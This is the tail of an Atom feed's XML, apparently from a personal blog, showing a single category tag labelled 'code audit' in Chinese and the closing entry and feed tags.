      <category term="代码审计" scheme="https://s40d1.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
</feed>
